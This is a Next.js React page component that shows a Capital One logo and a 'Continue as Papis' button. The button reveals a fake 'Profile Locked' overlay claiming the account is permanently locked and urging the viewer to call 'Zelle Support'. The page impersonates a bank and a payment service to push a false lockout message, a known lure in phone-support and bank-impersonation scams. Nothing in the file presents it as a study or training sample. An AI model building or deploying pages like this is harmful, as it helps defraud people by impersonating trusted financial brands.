'use client'
import Image from 'next/image'
import capital from '../../../public/capital.jpeg'
import { useState } from 'react'
import { AiFillWarning } from "react-icons/ai";

export default function Home() {
    const [displayInput, setDisplayInput] = useState(true)

    const handleDisplay = ()=> {
        if(displayInput === true){
            setDisplayInput(false)
        }else if (displayInput === false){
            setDisplayInput(true)
        }
    }

  return (
    <main>
    <section className={`${displayInput ? 'flex min-h-screen  flex-col items-center justify-between p-24' : 'hidden'}`}>
      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
        <Image src={capital} width={200} height={200} alt='capital-one-Logo'
         className="fixed left-0 top-0 flex w-full justify-center  border-red-900 
         bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800
          dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  
          lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30"/>
        
        

      </div>

        <div>
            <button className={`text-[30px]`} onClick={handleDisplay}>Continue as Papis</button>
        </div>
      
      
    </section>
    <div className={`${displayInput? ' hidden' : 'bg-neutral-500 opacity-95 min-h-screen py-96'} `}>
            <section className={`py-5 grid justify-center`}>
                <AiFillWarning size={35} className={`text-yellow-500 ml-14`}/>
                 <h2 className={` text-[20px] p-3`}>Profile Locked</h2>
            </section>
            <section className={`px-10 text-center text-[14px]`}>
                <p>For security reasons, your account has been permanently locked. Please call <span>Zelle</span> Support for assistance
                </p>
            </section>
            <div className={`p-5`}>
            <section className={`${displayInput? '': 'bg-white text-black p-10 '}`}>
                <div className={`${displayInput? '' : 'hover:bg-green-400 p-5' }`}>
                    <button>CONTACT CUSTOMER SERVICE</button>
                </div>
                    <div className={`${displayInput? '' : 'hover:bg-green-400 py-5 px-20' }`}>
                        <button className={`text-center`}>Ok, MAYBE LATER</button>
                    </div>
            </section>
           
            </div>
        </div>
    </main>
  )
}
